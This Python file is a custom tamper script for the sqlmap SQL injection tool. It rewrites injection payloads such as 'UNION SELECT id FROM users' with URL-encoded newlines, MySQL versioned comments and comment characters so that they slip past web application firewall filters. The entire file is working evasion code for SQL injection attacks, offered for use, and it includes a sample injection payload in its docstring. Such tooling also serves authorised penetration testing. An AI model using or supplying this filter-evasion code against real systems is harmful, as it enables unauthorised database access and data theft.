#!/usr/bin/env python

"""
write by Aaron
"""
from lib.core.enums import PRIORITY
from lib.core.settings import UNICODE_ENCODING
__priority__ = PRIORITY.LOW
def dependencies():
    pass
def tamper(payload, **kwargs):
    """
    Replaces keywords
    >>> tamper('UNION SELECT id FROM users')
    'union%0a/*!12345select*/id%0a/*!12345from*/users'
    """
    if payload:
        payload=payload.replace(" ALL SELECT ","%0a/*!12345select*/")
        payload=payload.replace("UNION SELECT","union%0a/*!12345select*/")
        payload=payload.replace(" FROM ","%0a/*!12345from*/")
        payload=payload.replace("CONCAT","CONCAT%23%0a")
        payload=payload.replace("CASE ","CASE%23%0a")
        payload=payload.replace("CAST(","/*!12345CASt(*/")
        payload=payload.replace("DATABASE()","database%0a()")
                
    return payload